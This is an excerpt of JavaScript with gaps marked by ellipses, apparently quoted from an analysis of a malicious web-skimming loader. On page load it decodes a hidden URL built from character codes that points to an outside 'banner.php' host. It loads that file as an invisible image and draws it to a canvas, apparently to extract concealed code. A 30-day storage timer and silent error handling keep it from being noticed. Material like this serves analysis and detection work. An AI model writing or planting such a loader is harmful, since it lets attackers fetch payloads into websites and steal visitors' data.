...
document.addEventListener("DOMContentLoaded", function () {
    ...
    function gkf(s) {
        ...
        i5.crossOrigin = "Anonymous", i5.style.display = "none", i5.setAttribute("src", s), i5.onload = function () {
            try {
                var context, canvas;
                canvas = document.createElement("canvas"), canvas.width = i5.width, canvas.height = i5.height, context = canvas.getContext("2d"), context.drawImage(i5, 0, 0);
    ...
    function rey() {
        try {
            ...
            var a, b = new Date,
                b = b.getTime(),
                c = String.fromCharCode(47, 47, 99, 100, 110, 112, 105, 99, 116, 117, 114, 101, 97, 115, 115, 101, 116, 46, 99, 111, 109, 47, 98, 97, 110, 110, 101, 114, 46, 112, 104, 112) + "?001e67e03bf5",
                d = 2592000000,
                e = "CDN_UUID";
            "undefined" == typeof Storage ? (a = gcv(e), (!a || a < b) && (sc(e, d), gkf(c))) : (a = window.localStorage.getItem(e), (!a || a < b) && (window.localStorage.setItem(e, b + d), gkf(c)))
        } catch (a) { }
    }
